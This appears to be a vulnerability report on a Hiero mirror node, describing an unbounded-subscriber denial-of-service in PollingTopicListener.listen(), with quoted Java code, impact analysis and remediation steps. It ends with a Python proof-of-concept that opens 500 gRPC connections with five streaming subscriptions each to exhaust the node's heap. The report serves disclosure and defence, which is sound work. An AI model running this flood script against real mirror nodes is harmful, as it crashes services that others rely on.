### Title
Unbounded Subscriber Resource Exhaustion in `PollingTopicListener.listen()` via Missing Global Subscriber Cap

### Summary
`PollingTopicListener.listen()` creates a new independent `PollingContext` object and a perpetual scheduled polling loop (repeating up to `Long.MAX_VALUE` times) for every subscriber, with no check against any maximum subscriber count. The only server-side guard — `maxConcurrentCallsPerConnection = 5` — limits calls per TCP connection, not total connections. An unprivileged attacker opening many connections can accumulate thousands of active polling subscriptions, each consuming heap, scheduler task slots, and a database query every 500 ms, collectively exhausting JVM heap and crashing mirror nodes.

### Finding Description

**Exact code path:**

`PollingTopicListener.listen()` (lines 34–49):
```java
public Flux<TopicMessage> listen(TopicMessageFilter filter) {
    PollingContext context = new PollingContext(filter);          // new object per subscriber
    Duration interval = listenerProperties.getInterval();        // default 500ms

    return Flux.defer(() -> poll(context))
            .delaySubscription(interval, scheduler)
            .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)         // infinite loop per subscriber
                    .jitter(0.1)
                    .withFixedDelay(interval)
                    .withScheduler(scheduler))                   // shared boundedElastic scheduler
            ...
}
``` [1](#0-0) 

**Root cause — failed assumption:** The code assumes an external throttle will bound the number of callers. No such throttle exists. The `subscriberCount` field in `TopicMessageServiceImpl` is a Micrometer gauge metric only — it is incremented/decremented for observability but is **never compared against any maximum** to reject new subscriptions:

```java
private final AtomicLong subscriberCount = new AtomicLong(0L);
// ...
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
``` [2](#0-1) [3](#0-2) 

**Why the existing guard is insufficient:**

`GrpcConfiguration` applies `maxConcurrentCallsPerConnection = 5` (default):

```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
``` [4](#0-3) [5](#0-4) 

This limits concurrent RPC calls **per TCP connection**, not the total number of TCP connections. There is no `maxConnections` configured anywhere in `GrpcConfiguration`. An attacker opens N connections × 5 calls = 5N simultaneous subscriptions.

**`ListenerProperties` has no subscriber cap field:** [6](#0-5) 

**Per-subscription resource cost (POLL mode):**
- One `PollingContext` instance (heap: `AtomicLong` + `AtomicReference` + `TopicMessageFilter`)
- One perpetual `RepeatSpec.times(Long.MAX_VALUE)` task chain on the shared `boundedElastic()` scheduler
- One `topicMessageRepository.findByFilter()` database query fired every 500 ms [7](#0-6) 

Unlike `SharedPollingTopicListener` or `RedisTopicListener` which share a single upstream flux via `.share()`, `PollingTopicListener` is a **cold publisher** — every subscriber gets its own independent polling loop. [8](#0-7) 

### Impact Explanation

With thousands of active subscriptions, the JVM experiences:
1. **Heap exhaustion** from accumulated `PollingContext` objects and queued Reactor task chains.
2. **Scheduler saturation** — `Schedulers.boundedElastic()` caps threads at `10 × CPU cores` but queues tasks unboundedly; the task queue itself consumes heap.
3. **Database connection pool exhaustion** — each subscription fires a query every 500 ms; with a shared pool, legitimate queries are starved.
4. **OOM crash** — once heap is exhausted, the JVM throws `OutOfMemoryError`, crashing the mirror node process.

Targeting multiple mirror node instances simultaneously satisfies the ≥30% network processing node shutdown threshold.

### Likelihood Explanation

- **No authentication required**: The gRPC `subscribeTopic` endpoint is public; any network-reachable client can call it.
- **No rate limiting on the gRPC service**: Unlike the web3 module (which uses Bucket4j), the gRPC module has no request-rate or connection-rate limiter.
- **Low attacker capability**: Opening thousands of TCP connections and issuing gRPC streaming calls requires only a standard gRPC client library and a valid (or any, if `checkTopicExists=false`) topic ID.
- **Repeatable**: The attack can be re-launched after a node restart with no state to clear.
- **Condition**: The listener type must be configured as `POLL` (`hiero.mirror.grpc.listener.type=POLL`). The default is `REDIS`, which uses a shared flux and is not vulnerable to per-subscriber resource multiplication. However, `POLL` is a documented, supported configuration option. [9](#0-8) 

### Recommendation

1. **Enforce a global maximum subscriber count** in `TopicMessageServiceImpl.subscribeTopic()`: compare `subscriberCount.get()` against a configurable `maxSubscribers` property and return `RESOURCE_EXHAUSTED` gRPC status if exceeded.
2. **Add a `maxSubscribers` property** to `ListenerProperties` (or `GrpcProperties`) with a safe default (e.g., 200).
3. **Configure `maxConnectionAge`** on the Netty server builder to recycle long-lived connections and prevent indefinite accumulation.
4. **Add per-IP connection rate limiting** at the load balancer or ingress layer in front of the gRPC port.
5. Consider switching default listener type to `SHARED_POLL` or `REDIS` in environments where `POLL` is not required, as those implementations share a single upstream flux regardless of subscriber count.

### Proof of Concept

**Preconditions:**
- Mirror node running with `hiero.mirror.grpc.listener.type=POLL`
- gRPC port 5600 reachable
- A valid topic ID (e.g., `0.0.1000`), or `hiero.mirror.grpc.checkTopicExists=false`

**Steps:**

```python
import grpc
import threading
from proto import consensus_service_pb2_grpc, consensus_service_pb2, timestamp_pb2

TARGET = "mirror-node-host:5600"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1000
CONNECTIONS = 500   # 500 connections × 5 calls = 2500 subscriptions

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=...,
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0)
    )
    # Open 5 concurrent streaming calls on this connection
    streams = [stub.subscribeTopic(query) for _ in range(5)]
    # Keep streams alive
    for s in streams:
        try:
            for _ in s:
                pass
        except:
            pass

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

**Expected result:** After opening 2500+ subscriptions, the mirror node JVM heap climbs continuously (each subscription adds a `PollingContext` + scheduler tasks + DB queries every 500 ms). Within minutes, `GrpcHighMemory` alert fires (>80% heap), followed by `OutOfMemoryError` and process crash.

    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
